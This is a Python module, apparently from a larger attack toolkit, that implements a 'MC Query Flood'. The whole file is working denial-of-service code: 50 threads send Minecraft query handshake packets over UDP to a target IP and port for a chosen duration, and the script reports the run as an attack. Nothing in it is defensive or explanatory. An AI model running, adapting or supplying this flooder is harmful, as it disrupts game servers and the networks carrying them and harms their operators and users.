
import socket
import threading
import time
from colorama import Fore, init

init(autoreset=True)

def flood_worker(target_ip, target_port, duration, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'\xFE\xFD\x09\x00\x00\x00\x00'  

    end_time = time.time() + duration
    sent_packets = 0

    while not stop_event.is_set() and time.time() < end_time:
        try:
            sock.sendto(payload, (target_ip, target_port))
            sent_packets += 1
        except Exception:
            pass
    print(Fore.LIGHTYELLOW_EX + f"Thread finished, sent {sent_packets} packets.")

def run(args):
    if len(args) < 3:
        print(Fore.LIGHTRED_EX + "Usage: mc_query_flood <ip> <port> <duration_seconds>")
        return

    target_ip = args[0]
    try:
        target_port = int(args[1])
        duration = int(args[2])
    except ValueError:
        print(Fore.LIGHTRED_EX + "[!] Port and duration must be integers.")
        return

    print(Fore.LIGHTCYAN_EX + f"Starting MC Query Flood on {target_ip}:{target_port} for {duration}s")

    thread_count = 50  
    stop_event = threading.Event()
    threads = []

    for _ in range(thread_count):
        t = threading.Thread(target=flood_worker, args=(target_ip, target_port, duration, stop_event))
        t.start()
        threads.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + "\n[!] Attack interrupted by user.")
    finally:
        stop_event.set()
        for t in threads:
            t.join()

    print(Fore.LIGHTGREEN_EX + "MC Query Flood finished.")

